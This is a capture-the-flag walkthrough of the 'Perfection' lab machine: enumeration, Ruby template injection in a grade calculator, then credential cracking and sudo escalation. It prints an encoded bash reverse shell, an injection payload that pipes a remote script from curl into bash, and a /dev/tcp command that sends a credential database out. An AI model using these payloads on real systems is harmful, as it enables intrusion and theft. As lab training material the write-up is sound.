# Enumeration

Start with the classics:
`nmap -sV -sC -Pn 10.10.11.253`

I see ssh and port 80 open:
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 80:e4:79:e8:59:28:df:95:2d:ad:57:4a:46:04:ea:70 (ECDSA)
|_  256 e9:ea:0c:1d:86:13:ed:95:a9:d0:0b:c8:22:e4:cf:e9 (ED25519)
80/tcp open  http    nginx
|_http-title: Weighted Grade Calculator
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


Looks to be a calculator of some kind. Adding to etc hosts:
`echo '10.10.11.253 perfection.htb' | sudo tee -a /etc/hosts`

Now looking at the page...

The main page calls out WEBrick 1.7.0. But it doesn't appear theres is any vulns with that version.

There is also a page that allows for weighted-grade calculation. There could be inject vulns here.. 

But first lets directory fuzz.

`ffuf -w /Users/noneya/Useful/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt:FUZZ -u http://perfection.htb/FUZZ -ic`

While that runs I am going to test for other vulns...

I am seeing that when I enter junk info, it tells me enter a number but it seems to be front end.

The input fields of the calculator require the weights to equal 100.

But when I get past that it says malicious input blocked... So this might be the trick.

Directory fuzz isn't finding anything.

I could try obfuscation. But lets find the field that is vulnerable first.

So it appears to block any input that isn't a number in the grade field, what if I append ; to it?

The newline character isn't blocked...

So I can inject the new line and then ; now but no output is returned... Maybe a reverse shell?

Starting a hosted server on 8080 and seeing if I can netcat.

Using the grade field failed. But I just found that it says malicous input on the category field too.

When I try this `%3Bbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.10.232%2F2222%200%3E%261` its blocked and when I checked trying to end the string with ' it blocks it too...

This is definitly the weakness, but I am having trouble finding it...

Think its interesting that the About Us page mentions that the professor is a sysadmin. Likely part of the privesc if I was guessing.

I do see that the request seems to accept gzip encoding... maybe I could try that?

Nope and SQLmap didn't find anything either.

I could try SSI I guess. Interesting. [This page](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby---code-execution) shows SSTI for ruby and `<%= 7 * 7 %>` works when URL encoded and wrapped on both ends with a new line... As long as the new line is also followed by a valid string.

So I think I can try to run a reverse shell now.
Putting this in any category field works:
`%0A%3C%25%3D%20%60curl%20'http%3A%2F%2F10.10.14.232%3A8888%2FrevSh.sh'%7Cbash%60%20%25%3E%0A0`

Voila a reverse shell.

# Foothold

For pretty shell:
```
script /dev/null -qc /bin/bash
stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```

Lets get the user flag:
`find -name '*user.txt' 2>/dev/null`

So now for privesc. Lets try sudo -l. Nothing...

When I cat /etc/passwd I only see the susan user that we are. But it did mention that we were a sysadmin in the about us page...

Looks like there is a file called pupilpath_credentials.db which is a SQLite db.

Gonna export to my local machine and try and read it.

On my local box:
`nc -lnvp 3333 > pupil_creds.db`

On the reverse shell:
`cat pupilpath_credentials.db > /dev/tcp/10.10.14.232/3333`

Then we can run `sqlite pupil_creds.db`

Then we can run `.tables` to see the tables.

Theres a users tables, so we can do `select * from users;`

Looks like it has a bunch of users and passwords. But we know Susan Miller is the sysadmin, so I think we can just crack hers.

Her hash is: `abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f`

I used [this page](https://www.tunnelsup.com/hash-analyzer/) to determine this is a Sha2-256 hash.

so we can try:
`hashcat --force -m 1400 hash.txt /Users/noneya/Useful/Wordlists/rockyou.txt`

But that fails. The discussion board mentions "checking your mail"

So I ran `find -name '*mail*' 2>/dev/null` and found that there is a /var/mail/susan with password specifications...

```
Due to our transition to Jupiter Grades because of the PupilPath data breach, I thought we should also migrate our credentials ('our' including the other students

in our class) to the new platform. I also suggest a new password specification, to make things easier for everyone. The password format is:

{firstname}_{firstname backwards}_{randomly generated integer between 1 and 1,000,000,000}

Note that all letters of the first name should be convered into lowercase.

Please hit me with updates on the migration when you can. I am currently registering our university with the platform.

- Tina, your delightful student

```

Since we are literally just interested in Susan we could just create this wordlist manually.

I found the password with my script:
susan_nasus_413759210

And running sudo -l I confirmed it, as well as that I have all access.

So I can run:
`sudo find -name '*root.txt' 2>/dev/null`

Then:
`sudo cat ./root/root.txt` and I am good to go.
